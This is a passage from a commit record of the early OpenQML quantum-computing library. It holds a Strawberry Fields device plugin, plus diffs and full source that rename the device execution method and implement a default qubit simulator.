Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"This module contains the device class and context manager\"\"\"\nimport numpy as np\nfrom openqml import Device, DeviceError\nfrom openqml import Variable\n\nimport strawberryfields as sf\n\n#import state preparations\nfrom strawberryfields.ops import (Catstate, Coherent, DensityMatrix, DisplacedSqueezed,\n                                  Fock, Ket, Squeezed, Thermal, Gaussian)\n# import decompositions\nfrom strawberryfields.ops import (GaussianTransform, Interferometer)\n# import gates\nfrom strawberryfields.ops import (BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate,\n                                  Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate)\n# import measurements\nfrom strawberryfields.ops import (MeasureFock, MeasureHeterodyne, MeasureHomodyne)\n\n\nfrom ._version import __version__\n\n\noperator_map = {\n    'CoherentState': Coherent,\n    'DisplacedSqueezed': DisplacedSqueezed,\n    'SqueezedState': Squeezed,\n    'ThermalState': Thermal,\n    'GaussianState': Gaussian,\n    'Beamsplitter': BSgate,\n    'ControlledAddition': CXgate,\n    'ControlledPhase': CZgate,\n    'Displacement': Dgate,\n    'QuadraticPhase': Pgate,\n    'Rotation': Rgate,\n    'TwoModeSqueezing': S2gate,\n    'Squeeze': Sgate,\n    # 'XDisplacement': Xgate,\n    # 'PDisplacement': Zgate,\n    # 'MeasureHomodyne': MeasureHomodyne,\n    # 'MeasureHeterodyne': MeasureHeterodyne\n}\n\n\n\nclass StrawberryFieldsGaussian(Device):\n    \"\"\"StrawberryFields Gaussian device for OpenQML.\n\n    wires (int): the number of modes to initialize the device in.\n    hbar (float): the convention chosen in the canonical commutation\n        relation [x, p] = i hbar. The default value is hbar=2.\n    \"\"\"\n    name = 'Strawberry Fields OpenQML plugin'\n    short_name = 'strawberryfields.fock'\n    api_version = '0.1.0'\n    version = __version__\n    author = 'Josh Izaac'\n    _gates = set(operator_map.keys())\n    _observables = {'Fock', 'X', 'P', 'Homodyne', 'Heterodyne'}\n    _circuits = {}\n\n    def __init__(self, wires, *, shots=0, hbar=2):\n        self.wires = wires\n        self.hbar = hbar\n        self.eng = None\n        self.state = None\n        super().__init__(self.short_name, shots)\n\n    def execute(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        if self.eng:\n            self.eng.reset()\n            self.reset()\n\n        self.eng, q = sf.Engine(self.wires, hbar=self.hbar)\n\n        with self.eng:\n            for operation in self._queue:\n                if operation.name not in operator_map:\n                    raise DeviceError(\"{} not supported by device {}\".format(operation.name, self.short_name))\n\n                p = [x.val if isinstance(x, Variable) else x for x in operation.params]\n                op = operator_map[operation.name](*p)\n                if isinstance(operation.wires, int):\n                    op | q[operation.wires]\n                else:\n                    op | [q[i] for i in operation.wires]\n\n        self.state = self.eng.run('gaussian')\n\n        # calculate expectation value\n        reg = self._observe.wires\n        if self._observe.name == 'Fock':\n            ex = self.state.mean_photon(reg)\n            var = 0\n        elif self._observe.name == 'X':\n            ex, var = self.state.quad_expectation(reg, 0)\n        elif self._observe.name == 'P':\n            ex, var = self.state.quad_expectation(reg, np.pi/2)\n        elif self._observe.name == 'Homodyne':\n            ex, var = self.state.quad_expectation(reg, *self._observe.params)\n        elif self._observe.name == 'Displacement':\n            ex = self.state.displacement(modes=reg)\n\n        if self.shots != 0:\n            # estimate the expectation value\n            # use central limit theorem, sample normal distribution once, only ok\n            # if shots is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)\n            ex = np.random.normal(ex, np.sqrt(var / self.shots))\n\n        self._out = ex\n\n    def reset(self):\n        \"\"\"Reset the device\"\"\"\n        if self.eng is not None:\n            self.eng = None\n            self.state = None\n"}, "/openqml/device.py": {"changes": [{"diff": "\n         \"\"\"\n         return cls._capabilities\n \n-    @abc.abstractmethod\n     def execute(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n+        self._out = self.execute_queued()\n+\n+    @abc.abstractmethod\n+    def execute_queued(self):\n+        \"\"\"Called during execute(). To be implemented by each plugin.\n+\n+        Returns:\n+          float: expectation value(s) #todo: This should become an array type to handle multiple expectation values.\n+        \"\"\"\n         raise NotImplementedError\n \n     @abc.abstractmet", "add": 9, "remove": 1, "filename": "/openqml/device.py", "badparts": ["    @abc.abstractmethod"], "goodparts": ["        self._out = self.execute_queued()", "    @abc.abstractmethod", "    def execute_queued(self):", "        \"\"\"Called during execute(). To be implemented by each plugin.", "        Returns:", "          float: expectation value(s) #todo: This should become an array type to handle multiple expectation values.", "        \"\"\""]}], "source": "\n \"\"\"This module contains the device class and context manager\"\"\" import abc import logging logging.getLogger() class MethodFactory(type): \"\"\"Metaclass that allows derived classes to dynamically instantiate new objects based on undefined methods. The dynamic methods pass their arguments directly to __init__ of the inheriting class.\"\"\" def __getattr__(cls, name): \"\"\"Get the attribute call via name\"\"\" def new_object(*args, **kwargs): \"\"\"Return a new object of the same class, passing the attribute name as the first parameter, along with any additional parameters.\"\"\" return cls(name, *args, **kwargs) return new_object class DeviceError(Exception): \"\"\"Exception raised by a:class:`Device` when it encounters an illegal operation in the quantum circuit. \"\"\" pass class Device(abc.ABC): \"\"\"Abstract base class for devices.\"\"\" _current_context=None name='' short_name='' api_version='' version='' author='' _capabilities={} _gates={} _observables={} _circuits={} def __init__(self, name, shots): self.name=name self.shots=shots self._out=None self._queue=[] self._observe=None def __repr__(self): \"\"\"String representation.\"\"\" return self.__module__ +'.' +self.__class__.__name__ +'\\nInstance: ' +self.name def __str__(self): \"\"\"Verbose string representation.\"\"\" return self.__repr__() +'\\nName: ' +self.name +'\\nAPI version: ' +self.api_version\\ +'\\nPlugin version: ' +self.version +'\\nAuthor: ' +self.author +'\\n' def __enter__(self): if Device._current_context is None: Device._current_context=self self.reset() else: raise DeviceError('Only one device can be active at a time.') return self def __exit__(self, exc_type, exc_value, tb): if self._observe is None: raise DeviceError('A qfunc must always conclude with a classical expectation value.') Device._current_context=None self.execute() @property def gates(self): \"\"\"Get the supported gate set. Returns: dict[str->GateSpec]: \"\"\" return self._gates @property def observables(self): \"\"\"Get the supported observables. Returns: dict[str->GateSpec]: \"\"\" return self._observables @property def templates(self): \"\"\"Get the predefined circuit templates. .. todo:: rename to circuits? Returns: dict[str->Circuit]: circuit templates \"\"\" return self._circuits @property def result(self): \"\"\"Get the circuit result. Returns: float or int \"\"\" return self._out @classmethod def capabilities(cls): \"\"\"Get the other capabilities of the plugin. Measurements, batching etc. Returns: dict[str->*]: results \"\"\" return cls._capabilities @abc.abstractmethod def execute(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" raise NotImplementedError @abc.abstractmethod def reset(self): \"\"\"Reset the backend state. After the reset the backend should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" raise NotImplementedError ", "sourceWithComments": "# Copyright 2018 Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"This module contains the device class and context manager\"\"\"\n\nimport abc\nimport logging\n\n\nlogging.getLogger()\n\n\nclass MethodFactory(type):\n    \"\"\"Metaclass that allows derived classes to dynamically instantiate\n    new objects based on undefined methods. The dynamic methods pass their arguments\n    directly to __init__ of the inheriting class.\"\"\"\n    def __getattr__(cls, name):\n        \"\"\"Get the attribute call via name\"\"\"\n        def new_object(*args, **kwargs):\n            \"\"\"Return a new object of the same class, passing the attribute name\n            as the first parameter, along with any additional parameters.\"\"\"\n            return cls(name, *args, **kwargs)\n        return new_object\n\n\nclass DeviceError(Exception):\n    \"\"\"Exception raised by a :class:`Device` when it encounters an illegal\n    operation in the quantum circuit.\n    \"\"\"\n    pass\n\n\nclass Device(abc.ABC):\n    \"\"\"Abstract base class for devices.\"\"\"\n    _current_context = None\n    name = ''          #: str: official device plugin name\n    short_name = ''    #: str: name used to load device plugin\n    api_version = ''   #: str: version of OpenQML for which the plugin was made\n    version = ''       #: str: version of the device plugin itself\n    author = ''        #: str: plugin author(s)\n    _capabilities = {} #: dict[str->*]: plugin capabilities\n    _gates = {}        #: dict[str->GateSpec]: specifications for supported gates\n    _observables = {}  #: dict[str->GateSpec]: specifications for supported observables\n    _circuits = {}     #: dict[str->Circuit]: circuit templates associated with this API class\n\n    def __init__(self, name, shots):\n        self.name = name # the name of the device\n\n        # number of circuit evaluations used to estimate\n        # expectation values of observables. 0 means the exact ev is returned.\n        self.shots = shots\n\n        self._out = None  # this attribute stores the expectation output\n        self._queue = []  # this list stores the operations to be queued to the device\n        self._observe = None # the measurement operation to be performed\n\n    def __repr__(self):\n        \"\"\"String representation.\"\"\"\n        return self.__module__ +'.' +self.__class__.__name__ +'\\nInstance: ' +self.name\n\n    def __str__(self):\n        \"\"\"Verbose string representation.\"\"\"\n        return self.__repr__() +'\\nName: ' +self.name +'\\nAPI version: ' +self.api_version\\\n            +'\\nPlugin version: ' +self.version +'\\nAuthor: ' +self.author +'\\n'\n\n    def __enter__(self):\n        if Device._current_context is None:\n            Device._current_context = self\n            self.reset()\n        else:\n            raise DeviceError('Only one device can be active at a time.')\n        return self\n\n    def __exit__(self, exc_type, exc_value, tb):\n        if self._observe is None:\n            raise DeviceError('A qfunc must always conclude with a classical expectation value.')\n        Device._current_context = None\n        self.execute()\n\n    @property\n    def gates(self):\n        \"\"\"Get the supported gate set.\n\n        Returns:\n          dict[str->GateSpec]:\n        \"\"\"\n        return self._gates\n\n    @property\n    def observables(self):\n        \"\"\"Get the supported observables.\n\n        Returns:\n          dict[str->GateSpec]:\n        \"\"\"\n        return self._observables\n\n    @property\n    def templates(self):\n        \"\"\"Get the predefined circuit templates.\n\n        .. todo:: rename to circuits?\n\n        Returns:\n          dict[str->Circuit]: circuit templates\n        \"\"\"\n        return self._circuits\n\n    @property\n    def result(self):\n        \"\"\"Get the circuit result.\n\n        Returns:\n            float or int\n        \"\"\"\n        return self._out\n\n    @classmethod\n    def capabilities(cls):\n        \"\"\"Get the other capabilities of the plugin.\n\n        Measurements, batching etc.\n\n        Returns:\n          dict[str->*]: results\n        \"\"\"\n        return cls._capabilities\n\n    @abc.abstractmethod\n    def execute(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        raise NotImplementedError\n\n    @abc.abstractmethod\n    def reset(self):\n        \"\"\"Reset the backend state.\n\n        After the reset the backend should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        raise NotImplementedError\n"}, "/openqml/plugins/default.py": {"changes": [{"diff": "\n         self._state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self._state is None:\n             # init the state vector to |00..0>\n", "add": 1, "remove": 1, "filename": "/openqml/plugins/default.py", "badparts": ["    def execute(self):"], "goodparts": ["    def execute_queued(self):"]}], "source": "\n \"\"\"This module contains the device class and context manager\"\"\" import numpy as np from scipy.linalg import expm, eigh import openqml as qm from openqml import Device, DeviceError, qfunc, QNode, Variable, __version__ tolerance=1e-10 def spectral_decomposition_qubit(A): r\"\"\"Spectral decomposition of a 2*2 Hermitian matrix. Args: A(array): 2*2 Hermitian matrix Returns: (vector[float], list[array[complex]]):(a, P): eigenvalues and hermitian projectors such that:math:`A=\\sum_k a_k P_k`. \"\"\" d, v=eigh(A) P=[] for k in range(2): temp=v[:, k] P.append(np.outer(temp.conj(), temp)) return d, P I=np.eye(2) X=np.array([[0, 1],[1, 0]]) Y=np.array([[0, -1j],[1j, 0]]) Z=np.array([[1, 0],[0, -1]]) CNOT=np.array([[1, 0, 0, 0],[0, 1, 0, 0],[0, 0, 0, 1],[0, 0, 1, 0]]) SWAP=np.array([[1, 0, 0, 0],[0, 0, 1, 0],[0, 1, 0, 0],[0, 0, 0, 1]]) def frx(theta): r\"\"\"One-qubit rotation about the x axis. Args: theta(float): rotation angle Returns: array: unitary 2x2 rotation matrix:math:`e^{-i \\sigma_x \\theta/2}` \"\"\" return expm(-1j * theta/2 * X) def fry(theta): r\"\"\"One-qubit rotation about the y axis. Args: theta(float): rotation angle Returns: array: unitary 2x2 rotation matrix:math:`e^{-i \\sigma_y \\theta/2}` \"\"\" return expm(-1j * theta/2 * Y) def frz(theta): r\"\"\"One-qubit rotation about the z axis. Args: theta(float): rotation angle Returns: array: unitary 2x2 rotation matrix:math:`e^{-i \\sigma_z \\theta/2}` \"\"\" return expm(-1j * theta/2 * Z) def fr3(a, b, c): r\"\"\"Arbitrary one-qubit rotation using three Euler angles. Args: a,b,c(float): rotation angles Returns: array: unitary 2x2 rotation matrix rz(c) @ ry(b) @ rz(a) \"\"\" return frz(c) @(fry(b) @ frz(a)) def ket(*args): r\"\"\"Input validation for an arbitary state vector. Args: args(array): NumPy array. Returns: array: normalised array. \"\"\" state=np.asarray(args) return state/np.linalg.norm(state) def unitary(*args): r\"\"\"Input validation for an arbitary unitary operation. Args: args(array): square unitary matrix. Returns: array: square unitary matrix. \"\"\" U=np.asarray(args[0]) if U.shape[0] !=U.shape[1]: raise ValueError(\"Operator must be a square matrix.\") if not np.allclose(U @ U.conj().T, np.identity(U.shape[0]), atol=tolerance): raise ValueError(\"Operator must be unitary.\") return U def hermitian(*args): r\"\"\"Input validation for an arbitary Hermitian observable. Args: args(array): square hermitian matrix. Returns: array: square hermitian matrix. \"\"\" A=np.asarray(args[0]) if A.shape[0] !=A.shape[1]: raise ValueError(\"Observable must be a square matrix.\") if not np.allclose(A, A.conj().T, atol=tolerance): raise ValueError(\"Observable must be Hermitian.\") return A operator_map={ 'QubitStateVector': ket, 'QubitUnitary': unitary, 'Hermitian': hermitian, 'Identity': I, 'PauliX': X, 'PauliY': Y, 'PauliZ': Z, 'CNOT': CNOT, 'SWAP': SWAP, 'RX': frx, 'RY': fry, 'RZ': frz, 'Rot': fr3 } class DefaultQubit(Device): \"\"\"Default qubit device for OpenQML. wires(int): the number of modes to initialize the device in. cutoff(int): the Fock space truncation. Must be specified before applying a qfunc. hbar(float): the convention chosen in the canonical commutation relation[x, p]=i hbar. The default value is hbar=2. \"\"\" name='Default OpenQML plugin' short_name='default.qubit' api_version='0.1.0' version='0.1.0' author='Xanadu Inc.' _gates=set(operator_map.keys()) _observables={} _circuits={} def __init__(self, wires, *, shots=0): self.wires=wires self.eng=None self._state=None super().__init__(self.short_name, shots) def execute(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" if self._state is None: self._state=np.zeros(2**self.wires, dtype=complex) self._state[0]=1 self._out=np.full(self.wires, np.nan) for operation in self._queue: if operation.name=='QubitStateVector': state=np.asarray(operation.params[0]) if state.ndim==1 and state.shape[0]==2**self.wires: self._state=state else: raise ValueError('State vector must be of length 2**wires.') continue U=DefaultQubit._get_operator_matrix(operation) if len(operation.wires)==1: U=self.expand_one(U, operation.wires) elif len(operation.wires)==2: U=self.expand_two(U, operation.wires) else: raise ValueError('This plugin supports only one-and two-qubit gates.') self._state=U @ self._state A=DefaultQubit._get_operator_matrix(self._observe) if self.shots==0: ev=self.ev(A,[self._observe.wires]) else: if 0: ev=self.ev(A, self._observe.wires) var=self.ev(A**2, self._observe.wires) -ev**2 ev=np.random.normal(ev, np.sqrt(var / self.shots)) else: a, P=spectral_decomposition_qubit(A) p0=self.ev(P[0], self._observe.wires) n0=np.random.binomial(self.shots, p0) ev=(n0*a[0] +(self.shots-n0)*a[1]) / self.shots self._out=ev @classmethod def _get_operator_matrix(cls, A): \"\"\"Get the operator matrix for a given operation. Args: A(openqml.Operation or openqml.Expectation): operation/observable. Returns: array: matrix representation. \"\"\" if A.name not in operator_map: raise DeviceError(\"{} not supported by device{}\".format(A.name, cls.short_name)) if not callable(operator_map[A.name]): return operator_map[A.name] p=[x.val if isinstance(x, Variable) else x for x in A.params] return operator_map[A.name](*p) def ev(self, A, wires): r\"\"\"Expectation value of a one-qubit observable in the current state. Args: A(array): 2*2 hermitian matrix corresponding to the observable wires(Sequence[int]): target subsystem Returns: float: expectation value:math:`\\expect{A}=\\bra{\\psi}A\\ket{\\psi}` \"\"\" if A.shape !=(2, 2): raise ValueError('2x2 matrix required.') A=self.expand_one(A, wires) expectation=np.vdot(self._state, A @ self._state) if np.abs(expectation.imag) > tolerance: log.warning('Nonvanishing imaginary part{} in expectation value.'.format(expectation.imag)) return expectation.real def reset(self): \"\"\"Reset the device\"\"\" self._state =None self._out=None def expand_one(self, U, wires): \"\"\"Expand a one-qubit operator into a full system operator. Args: U(array): 2*2 matrix wires(Sequence[int]): target subsystem Returns: array: 2^n*2^n matrix \"\"\" if U.shape !=(2, 2): raise ValueError('2x2 matrix required.') if len(wires) !=1: raise ValueError('One target subsystem required.') wires=wires[0] before=2**wires after =2**(self.wires-wires-1) U=np.kron(np.kron(np.eye(before), U), np.eye(after)) return U def expand_two(self, U, wires): \"\"\"Expand a two-qubit operator into a full system operator. Args: U(array): 4x4 matrix wires(Sequence[int]): two target subsystems(order matters!) Returns: array: 2^n*2^n matrix \"\"\" if U.shape !=(4, 4): raise ValueError('4x4 matrix required.') if len(wires) !=2: raise ValueError('Two target subsystems required.') wires=np.asarray(wires) if np.any(wires < 0) or np.any(wires >=self.wires) or wires[0]==wires[1]: raise ValueError('Bad target subsystems.') a=np.min(wires) b=np.max(wires) n_between=b-a-1 before =2**a after =2**(self.wires-b-1) between=2**n_between U=np.kron(U, np.eye(between)) if wires[0] < wires[1]: p=[0, 2, 1] else: p=[1, 2, 0] dim=[2, 2, between] p=np.array(p) perm=np.r_[p, p+3] temp=np.prod(dim) U=U.reshape(dim * 2).transpose(perm).reshape([temp, temp]) U=np.kron(np.kron(np.eye(before), U), np.eye(after)) return U dev=DefaultQubit(wires=2) def node(x, y, z): qm.RX(x,[0]) qm.CNOT([0, 1]) qm.RY(-1.6,[0]) qm.RY(y,[1]) qm.CNOT([1, 0]) qm.RX(z,[0]) qm.CNOT([0, 1]) qm.expectation.Hermitian(np.array([[0, 1],[1, 0]]), 0) circuits={'demo_ev': QNode(node, dev)} ", "sourceWithComments": "# Copyright 2018 Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"This module contains the device class and context manager\"\"\"\nimport numpy as np\nfrom scipy.linalg import expm, eigh\n\nimport openqml as qm\nfrom openqml import Device, DeviceError, qfunc, QNode, Variable, __version__\n\n\n# tolerance for numerical errors\ntolerance = 1e-10\n\n\n#========================================================\n#  utilities\n#========================================================\n\ndef spectral_decomposition_qubit(A):\n    r\"\"\"Spectral decomposition of a 2*2 Hermitian matrix.\n\n    Args:\n      A (array): 2*2 Hermitian matrix\n\n    Returns:\n      (vector[float], list[array[complex]]): (a, P): eigenvalues and hermitian projectors\n        such that :math:`A = \\sum_k a_k P_k`.\n    \"\"\"\n    d, v = eigh(A)\n    P = []\n    for k in range(2):\n        temp = v[:, k]\n        P.append(np.outer(temp.conj(), temp))\n    return d, P\n\n\n#========================================================\n#  fixed gates\n#========================================================\n\nI = np.eye(2)\n# Pauli matrices\nX = np.array([[0, 1], [1, 0]])\nY = np.array([[0, -1j], [1j, 0]])\nZ = np.array([[1, 0], [0, -1]])\nCNOT = np.array([[1, 0, 0, 0], [0, 1, 0, 0], [0, 0, 0, 1], [0, 0, 1, 0]])\nSWAP = np.array([[1, 0, 0, 0], [0, 0, 1, 0], [0, 1, 0, 0], [0, 0, 0, 1]])\n\n\n#========================================================\n#  parametrized gates\n#========================================================\n\n\ndef frx(theta):\n    r\"\"\"One-qubit rotation about the x axis.\n\n    Args:\n        theta (float): rotation angle\n    Returns:\n        array: unitary 2x2 rotation matrix :math:`e^{-i \\sigma_x \\theta/2}`\n    \"\"\"\n    return expm(-1j * theta/2 * X)\n\n\ndef fry(theta):\n    r\"\"\"One-qubit rotation about the y axis.\n\n    Args:\n        theta (float): rotation angle\n    Returns:\n        array: unitary 2x2 rotation matrix :math:`e^{-i \\sigma_y \\theta/2}`\n    \"\"\"\n    return expm(-1j * theta/2 * Y)\n\n\ndef frz(theta):\n    r\"\"\"One-qubit rotation about the z axis.\n\n    Args:\n        theta (float): rotation angle\n    Returns:\n        array: unitary 2x2 rotation matrix :math:`e^{-i \\sigma_z \\theta/2}`\n    \"\"\"\n    return expm(-1j * theta/2 * Z)\n\n\ndef fr3(a, b, c):\n    r\"\"\"Arbitrary one-qubit rotation using three Euler angles.\n\n    Args:\n        a,b,c (float): rotation angles\n    Returns:\n        array: unitary 2x2 rotation matrix rz(c) @ ry(b) @ rz(a)\n    \"\"\"\n    return frz(c) @ (fry(b) @ frz(a))\n\n\n#========================================================\n#  Arbitrary states and operators\n#========================================================\n\ndef ket(*args):\n    r\"\"\"Input validation for an arbitary state vector.\n\n    Args:\n        args (array): NumPy array.\n\n    Returns:\n        array: normalised array.\n    \"\"\"\n    state = np.asarray(args)\n    return state/np.linalg.norm(state)\n\n\ndef unitary(*args):\n    r\"\"\"Input validation for an arbitary unitary operation.\n\n    Args:\n        args (array): square unitary matrix.\n\n    Returns:\n        array: square unitary matrix.\n    \"\"\"\n    U = np.asarray(args[0])\n\n    if U.shape[0] != U.shape[1]:\n        raise ValueError(\"Operator must be a square matrix.\")\n\n    if not np.allclose(U @ U.conj().T, np.identity(U.shape[0]), atol=tolerance):\n        raise ValueError(\"Operator must be unitary.\")\n\n    return U\n\n\ndef hermitian(*args):\n    r\"\"\"Input validation for an arbitary Hermitian observable.\n\n    Args:\n        args (array): square hermitian matrix.\n\n    Returns:\n        array: square hermitian matrix.\n    \"\"\"\n    A = np.asarray(args[0])\n\n    if A.shape[0] != A.shape[1]:\n        raise ValueError(\"Observable must be a square matrix.\")\n\n    if not np.allclose(A, A.conj().T, atol=tolerance):\n        raise ValueError(\"Observable must be Hermitian.\")\n    return A\n\n\n#========================================================\n#  operator map\n#========================================================\n\n\noperator_map = {\n    'QubitStateVector': ket,\n    'QubitUnitary': unitary,\n    'Hermitian': hermitian,\n    'Identity': I,\n    'PauliX': X,\n    'PauliY': Y,\n    'PauliZ': Z,\n    'CNOT': CNOT,\n    'SWAP': SWAP,\n    'RX': frx,\n    'RY': fry,\n    'RZ': frz,\n    'Rot': fr3\n}\n\n\n#========================================================\n#  device\n#========================================================\n\n\nclass DefaultQubit(Device):\n    \"\"\"Default qubit device for OpenQML.\n\n    wires (int): the number of modes to initialize the device in.\n    cutoff (int): the Fock space truncation. Must be specified before\n        applying a qfunc.\n    hbar (float): the convention chosen in the canonical commutation\n        relation [x, p] = i hbar. The default value is hbar=2.\n    \"\"\"\n    name = 'Default OpenQML plugin'\n    short_name = 'default.qubit'\n    api_version = '0.1.0'\n    version = '0.1.0'\n    author = 'Xanadu Inc.'\n    _gates = set(operator_map.keys())\n    _observables = {}\n    _circuits = {}\n\n    def __init__(self, wires, *, shots=0):\n        self.wires = wires\n        self.eng = None\n        self._state = None\n        super().__init__(self.short_name, shots)\n\n    def execute(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        if self._state is None:\n            # init the state vector to |00..0>\n            self._state = np.zeros(2**self.wires, dtype=complex)\n            self._state[0] = 1\n            self._out = np.full(self.wires, np.nan)\n\n        # apply unitary operations U\n        for operation in self._queue:\n            if operation.name == 'QubitStateVector':\n                state = np.asarray(operation.params[0])\n                if state.ndim == 1 and state.shape[0] == 2**self.wires:\n                    self._state = state\n                else:\n                    raise ValueError('State vector must be of length 2**wires.')\n                continue\n\n            U = DefaultQubit._get_operator_matrix(operation)\n\n            if len(operation.wires) == 1:\n                U = self.expand_one(U, operation.wires)\n            elif len(operation.wires) == 2:\n                U = self.expand_two(U, operation.wires)\n            else:\n                raise ValueError('This plugin supports only one- and two-qubit gates.')\n            self._state = U @ self._state\n\n        # measurement/expectation value <psi|A|psi>\n        A = DefaultQubit._get_operator_matrix(self._observe)\n        if self.shots == 0:\n            # exact expectation value\n            ev = self.ev(A, [self._observe.wires])\n        else:\n            # estimate the ev\n            if 0:\n                # use central limit theorem, sample normal distribution once, only ok if n_eval is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)\n                ev = self.ev(A, self._observe.wires)\n                var = self.ev(A**2, self._observe.wires) - ev**2  # variance\n                ev = np.random.normal(ev, np.sqrt(var / self.shots))\n            else:\n                # sample Bernoulli distribution n_eval times / binomial distribution once\n                a, P = spectral_decomposition_qubit(A)\n                p0 = self.ev(P[0], self._observe.wires)  # probability of measuring a[0]\n                n0 = np.random.binomial(self.shots, p0)\n                ev = (n0*a[0] +(self.shots-n0)*a[1]) / self.shots\n\n        self._out = ev  # store the result\n\n    @classmethod\n    def _get_operator_matrix(cls, A):\n        \"\"\"Get the operator matrix for a given operation.\n\n        Args:\n            A (openqml.Operation or openqml.Expectation): operation/observable.\n\n        Returns:\n            array: matrix representation.\n        \"\"\"\n        if A.name not in operator_map:\n            raise DeviceError(\"{} not supported by device {}\".format(A.name, cls.short_name))\n\n        if not callable(operator_map[A.name]):\n            return operator_map[A.name]\n\n        # unpack variables\n        p = [x.val if isinstance(x, Variable) else x for x in A.params]\n        return operator_map[A.name](*p)\n\n    def ev(self, A, wires):\n        r\"\"\"Expectation value of a one-qubit observable in the current state.\n\n        Args:\n          A (array): 2*2 hermitian matrix corresponding to the observable\n          wires (Sequence[int]): target subsystem\n\n        Returns:\n          float: expectation value :math:`\\expect{A} = \\bra{\\psi}A\\ket{\\psi}`\n        \"\"\"\n        if A.shape != (2, 2):\n            raise ValueError('2x2 matrix required.')\n\n        A = self.expand_one(A, wires)\n        expectation = np.vdot(self._state, A @ self._state)\n\n        if np.abs(expectation.imag) > tolerance:\n            log.warning('Nonvanishing imaginary part {} in expectation value.'.format(expectation.imag))\n        return expectation.real\n\n    def reset(self):\n        \"\"\"Reset the device\"\"\"\n        self._state  = None  #: array: state vector\n        self._out = None  #: array: measurement results\n\n    def expand_one(self, U, wires):\n        \"\"\"Expand a one-qubit operator into a full system operator.\n\n        Args:\n          U (array): 2*2 matrix\n          wires (Sequence[int]): target subsystem\n\n        Returns:\n          array: 2^n*2^n matrix\n        \"\"\"\n        if U.shape != (2, 2):\n            raise ValueError('2x2 matrix required.')\n        if len(wires) != 1:\n            raise ValueError('One target subsystem required.')\n        wires = wires[0]\n        before = 2**wires\n        after  = 2**(self.wires-wires-1)\n        U = np.kron(np.kron(np.eye(before), U), np.eye(after))\n        return U\n\n    def expand_two(self, U, wires):\n        \"\"\"Expand a two-qubit operator into a full system operator.\n\n        Args:\n          U (array): 4x4 matrix\n          wires (Sequence[int]): two target subsystems (order matters!)\n\n        Returns:\n          array: 2^n*2^n matrix\n        \"\"\"\n        if U.shape != (4, 4):\n            raise ValueError('4x4 matrix required.')\n        if len(wires) != 2:\n            raise ValueError('Two target subsystems required.')\n        wires = np.asarray(wires)\n        if np.any(wires < 0) or np.any(wires >= self.wires) or wires[0] == wires[1]:\n            raise ValueError('Bad target subsystems.')\n\n        a = np.min(wires)\n        b = np.max(wires)\n        n_between = b-a-1  # number of qubits between a and b\n        # dimensions of the untouched subsystems\n        before  = 2**a\n        after   = 2**(self.wires-b-1)\n        between = 2**n_between\n\n        U = np.kron(U, np.eye(between))\n        # how U should be reordered\n        if wires[0] < wires[1]:\n            p = [0, 2, 1]\n        else:\n            p = [1, 2, 0]\n        dim = [2, 2, between]\n        p = np.array(p)\n        perm = np.r_[p, p+3]\n        # reshape U into another array which has one index per subsystem, permute dimensions, back into original-shape array\n        temp = np.prod(dim)\n        U = U.reshape(dim * 2).transpose(perm).reshape([temp, temp])\n        U = np.kron(np.kron(np.eye(before), U), np.eye(after))\n        return U\n\n\n#====================\n# Default circuits\n#====================\n\n\ndev = DefaultQubit(wires=2)\n\ndef node(x, y, z):\n    qm.RX(x, [0])\n    qm.CNOT([0, 1])\n    qm.RY(-1.6, [0])\n    qm.RY(y, [1])\n    qm.CNOT([1, 0])\n    qm.RX(z, [0])\n    qm.CNOT([0, 1])\n    qm.expectation.Hermitian(np.array([[0, 1], [1, 0]]), 0)\n\ncircuits = {'demo_ev': QNode(node, dev)}\n"}}, "msg": "Execute queued (#22)\n\n* added stub plugin file for the ProjectQ plugin\r\n\r\n* improved documentation and started coding\r\n\r\n* added gates and started modifying the implementation of the PluginAPI class\r\n\r\n* implemented initialization of engine\r\nfixed demo circuit\r\nfixed plugin name\r\nfixed typo in initialization of _capabilities\r\n\r\n* fixed gates and disabled some more \"problematic\" gates for now\r\n\r\n* implemented circuit execution and expectation value collection\r\nadded MeasureX, Y, and Z\r\n\r\n* use pq Compute() and Uncompute() to during execution\r\nmade demo circuits compatible with those of the SF plugin to make tests run more easiliy\r\n\r\n* first version that passes all tests for the standard Simulator backend\r\n\r\n* trying to get multi qubit gates to work\r\nexplained why only the Simulator backend can be enabled at the 